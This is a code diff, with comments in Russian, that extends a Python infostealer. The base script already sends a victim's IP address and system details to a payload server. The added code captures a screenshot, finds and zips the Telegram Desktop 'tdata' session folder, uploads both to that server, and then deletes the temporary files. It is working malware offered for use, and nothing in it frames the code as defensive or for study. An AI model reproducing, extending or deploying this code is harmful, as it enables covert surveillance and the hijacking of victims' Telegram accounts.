@@ -4,8 +4,12 @@ import platform
 import requests
 import json
 import socket
+import shutil
+import zipfile
 from datetime import datetime
+import subprocess
 
+# ТВОЙ СЕРВЕР (замени на свой URL)
 YOUR_SERVER = "https://payload-server-fmyh.onrender.com"
 
 def get_ip_info():
@@ -28,19 +32,75 @@ def get_system_info():
         'os': platform.platform()
     }
 
-def send_data(data):
+def take_screenshot():
     try:
-        requests.post(f"{YOUR_SERVER}/data", json=data, timeout=5)
+        screenshot_path = os.path.join(os.environ['TEMP'], 'screenshot.png')
+        import mss
+        with mss.mss() as sct:
+            sct.shot(output=screenshot_path)
+        return screenshot_path
     except:
-        pass
+        return None
+
+def find_telegram_tdata():
+    user_home = os.path.expanduser('~')
+    tdata_path = os.path.join(user_home, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
+    if os.path.exists(tdata_path):
+        return tdata_path
+    return None
+
+def zip_folder(folder_path, output_zip):
+    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                arcname = os.path.relpath(file_path, start=os.path.dirname(folder_path))
+                zipf.write(file_path, arcname)
+    return output_zip
+
+def send_data(data, files=None):
+    try:
+        if files:
+            response = requests.post(f"{YOUR_SERVER}/upload", data={'json': json.dumps(data)}, files=files, timeout=30)
+        else:
+            response = requests.post(f"{YOUR_SERVER}/data", json=data, timeout=10)
+        return response.status_code == 200
+    except:
+        return False
 
 def main():
+    hostname = socket.gethostname()
+    
+    # Собираем базовую информацию
     data = {
-        'timestamp': str(datetime.now()),
+        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'hostname': hostname,
         'ip': get_ip_info(),
         'system': get_system_info()
     }
-    send_data(data)
+    
+    # Скриншот
+    screenshot_path = take_screenshot()
+    files = []
+    
+    if screenshot_path and os.path.exists(screenshot_path):
+        files.append(('screenshot', (os.path.basename(screenshot_path), open(screenshot_path, 'rb'), 'image/png')))
+    
+    # Telegram tdata
+    tdata_path = find_telegram_tdata()
+    if tdata_path:
+        tdata_zip = os.path.join(os.environ['TEMP'], f'{hostname}_tdata.zip')
+        zip_folder(tdata_path, tdata_zip)
+        files.append(('tdata', (os.path.basename(tdata_zip), open(tdata_zip, 'rb'), 'application/zip')))
+    
+    # Отправляем
+    send_data(data, files)
+    
+    # Чистим временные файлы
+    if screenshot_path and os.path.exists(screenshot_path):
+        os.remove(screenshot_path)
+    if 'tdata_zip' in locals() and os.path.exists(tdata_zip):
+        os.remove(tdata_zip)
 
 if __name__ == "__main__":
     main()
